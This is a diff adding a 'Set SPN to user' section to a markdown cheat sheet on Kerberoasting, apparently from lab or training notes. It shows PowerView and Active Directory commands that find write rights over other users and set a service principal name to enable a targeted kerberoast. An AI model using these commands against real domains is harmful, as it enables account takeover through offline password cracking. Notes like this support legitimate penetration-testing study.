@@ -12,6 +12,29 @@ The Service Ticket is encrypted with the password of the user account: it is pos
 > Get-ADUser -Filter {ServicePrincipalName -eq "$null"} -Properties ServicePrincipalName
 ```
 
+## Set SPN to user
+
+If our user has `GenericWrite` or `GenericAll` to another user, it is then possible to write an SPN and perform a targeted kerberoast attack.
+
+```powershell
+# List our privileges on the group StudentUsers
+[PowerView]> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
+# Or use BloodHound to find this
+```
+
+Update SPN:
+
+```powershell
+> Set-ADUser -Identity <username> -ServicePrincipalNames @{Add='domain/SPN'} -Verbose
+[PowerView]> Set-DomainObject -Identity <username> -Set @{serviceprincipalname='domain/SPN'} -Verbose
+```
+
+Check that SPN has been updated:
+
+```powershell
+> Get-ADUser -Identity <username> -Properties ServicePrincipalName | select ServicePrincipalName
+```
+
 ## Request ST
 
 This command requests a Service Ticket for user `username`. The `/rc4opsec` flag only requests tickets for user accounts that support RC4.&#x20;
